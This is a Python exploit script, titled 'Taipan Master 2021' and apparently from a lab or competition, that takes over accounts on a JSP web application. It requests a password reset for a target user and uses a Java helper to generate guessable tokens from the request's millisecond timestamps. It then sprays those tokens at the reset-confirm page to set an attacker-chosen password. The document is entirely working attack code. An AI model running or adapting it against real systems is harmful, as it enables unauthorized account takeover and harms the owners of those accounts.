# Taipan Master 2021
#!/usr/bin/python3

import requests, argparse, os.path, subprocess, time

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user', help='Username to target', required=True)
parser.add_argument('-p', '--password', help='Password value to set', required=True)
parser.add_argument('-f', '--jfile', help='Specify the java program for tokens file building', required=True)
parser.add_argument('-t', '--target', help='Specify the target of the attack', required=True)
args = parser.parse_args()

target = args.target

def reqpassreset(t):
    smillisec = int(time.time() * 1000)
    print(smillisec)

    target = t + 'RequestPasswordReset.jsp'

    data = 'id=%s' % args.user    
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }

    res = requests.post(target, headers=headers, data=data, verify=False)
    
    if "Password reset request successful for %s" % args.user in res.text:
        emillisec = int(time.time() * 1000)
        print("Reset token request successful.")
        return smillisec, emillisec
    else:
        print(f"Failed to request reset token for " + args.user)
        exit(1)

def javaexec(java_file):
    sdate, edate = reqpassreset(target)

    print("Building tokens file. Please wait...")

    java_file = args.jfile
    java_class = os.path.splitext(java_file)[0]
    cmd = 'java %s %s %s' % (java_class, sdate, edate)

    with open('tokens.txt', 'a+') as f:
        subprocess.call(cmd.split(), stdout=f)
        
        return os.path.basename(f.name)

def passresconfirm(t):
    print("Starting token spray. Stand by...")
    
    tokens = javaexec(args.jfile)

    with open(tokens, "r") as f:
        for word in f:
            # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
            payload = {'t':word.strip(),'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

            r = requests.post(url=t + "PasswordResetConfirm.jsp", data=payload)
            res = r.text

            if "Unable to reset password" not in res:
                print("Successful reset with token: %s" % word)
                break


if __name__ == '__main__':
    passresconfirm(target)
